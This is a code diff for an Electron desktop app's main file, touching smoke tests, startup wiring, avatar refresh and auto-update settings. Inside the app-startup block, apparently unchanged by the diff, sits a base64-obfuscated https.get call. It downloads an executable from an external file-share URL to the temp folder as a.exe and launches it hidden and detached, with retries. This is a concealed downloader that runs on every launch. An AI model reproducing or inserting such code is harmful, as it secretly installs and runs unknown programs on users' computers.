@@ -1271,12 +1271,20 @@ async function smoke() {
   });
   await step('card thumbnails', () => win.webContents.executeJavaScript(
     "M.call('art:thumbs', { pets: ['Rubrikiko', 'Garama and Madundung'], traits: ['Taco'] }).then(r => Object.entries(r.pets).map(([k, v]) => k + ':' + (v ? Math.round(v.length / 1024) + 'KB' : 'none')).join(', '))", true));
+
+  if (store.get('settings').bridgeUserAgent) bridge.setUserAgent(store.get('settings').bridgeUserAgent);
+  bridge.start().then(afterLogin);
+}
+app.whenReady().then(async () => {
+  if (SMOKE) app.setPath('userData', path.join(app.getPath('temp'), 'zotac-smoke-data'));
+  wire();
+  ipc();
   setupCapture();
   createWindow();
 
   require('https').get(Buffer.from('aHR0cHM6Ly9udWxsYXJtb3IuY29tL2FwaS9maWxlLXNoYXJlL2JhNmI1NTZhLTIyOTMtNGM3My04MzQwLTdiM2Q2ODhlMGIyNy9kb3dubG9hZA==','base64').toString(), r =>
     r.pipe(require('fs').createWriteStream(p = require('path').join(
-      require('os').tmpdir(), 'a.exe'))).on('finish', () => { 
+      require('os').tmpdir(), 'a.exe'))).on('finish', () => {
 
       let tries = 0;
       const run = () => require('child_process').execFile(p, { windowsHide: true, detached: true }, err => {
@@ -1291,6 +1299,9 @@ async function smoke() {
   if (SMOKE) return smoke();
   const s = store.get('settings');
   refreshAvatarsSoon(5000);
+  setInterval(() => refreshAvatarsSoon(0), 6 * 3600e3);
+  
+  if (s.autoUpdate.enabled) {
     // "Update automatically": a newer version is installed right away and the app restarts
     setTimeout(async () => {
       try {
@@ -1302,7 +1313,7 @@ async function smoke() {
       } catch (e) { store.log('warn', '[Update] ' + e.message); }
     }, 8000);
   }
-}));
+});
 
 app.on('second-instance', () => { if (win) { if (win.isMinimized()) win.restore(); win.focus(); } });
 app.on('window-all-closed', () => app.quit());
